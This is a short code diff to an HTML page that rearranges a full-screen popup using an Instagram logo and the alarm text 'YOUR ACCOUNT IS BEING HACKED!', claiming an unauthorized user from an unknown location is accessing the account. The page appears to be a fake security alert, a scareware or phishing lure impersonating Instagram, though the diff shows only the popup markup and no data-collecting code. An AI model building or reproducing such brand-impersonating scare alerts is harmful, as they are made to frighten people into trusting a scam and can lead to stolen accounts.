@@ -210,13 +210,14 @@
   <!-- Warning box -->
   <div class="relative bg-white rounded-3xl p-6 max-w-sm w-full shadow-2xl border-4 border-red-600 animate-pulse">
     <!-- Header -->
-      <div>
+    
+    <div id="alert-popup" class="mobile-overlay">
+    <div class="absolute inset-0 bg-black/70"></div>
+    <div class="relative bg-white rounded-3xl p-6 w-full max-w-[320px] text-center shadow-2xl border border-red-200">
+      <div class="text-xl font-extrabold mb-4 text-red-700 flex items-center justify-center">⚠️ YOUR ACCOUNT IS BEING HACKED! ⚠️</div>
+  <div >
       <img src="logo ig.png" style="width: 50px; height: auto;">
 </div>
-    <h2 class="text-xl font-extrabold mb-4 text-red-700 flex items-center justify-center">
-      ⚠️ YOUR ACCOUNT IS BEING HACKED! ⚠️
-    </h2>
-
     <!-- Message -->
     <p class="mb-6 text-sm text-gray-800 font-semibold text-center">
       Your Instagram account is currently being accessed by an unauthorized user from an unknown location!  
@@ -440,6 +441,7 @@ document.getElementById('close-popup').addEventListener('click', () => {
   </script>
 </body>
 </html>
+
 
 
 
